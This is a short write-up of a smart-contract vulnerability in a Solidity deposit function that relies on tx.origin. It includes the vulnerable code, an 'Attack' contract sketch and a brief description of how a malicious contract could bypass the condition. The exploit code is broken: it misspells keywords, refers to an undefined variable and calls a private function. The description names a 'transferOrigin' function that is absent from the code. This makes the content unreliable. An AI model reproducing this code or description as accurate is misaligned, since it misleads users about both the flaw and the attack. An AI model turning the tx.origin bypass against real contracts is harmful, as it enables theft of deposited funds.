## Vulnerable Code

```javascript
function depositTokenFunction(address _token, uint256 _amount, address _beneficiary) private {
        tokens[_token][_beneficiary] = tokens[_token][_beneficiary].add(_amount);
        
        if(tx.origin == _beneficiary) lastActiveTransaction[tx.origin] = now;   //Vulnerable position
        
        emit Deposit(_token, _beneficiary, _amount, tokens[_token][_beneficiary]);
 }
```



## Exploit Code

```javascript
Contract Attack{
    address victim;
    function setVictimAddress(address _address){
        victim = _address;
    }
    function startAttack(){
        victimAddress.call(byte4(keccak256(“depositTokenFunction(address, uint256, address)”)), ..., ..., ...);
        ...
    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position.If an malicious contract such as "Attack" to call the Victim Contract function such as "transferOrigin", Due to the 'tx.origin' ,so "Attack" can bypass the body condition. ps:"...." represent an appropriate parameter
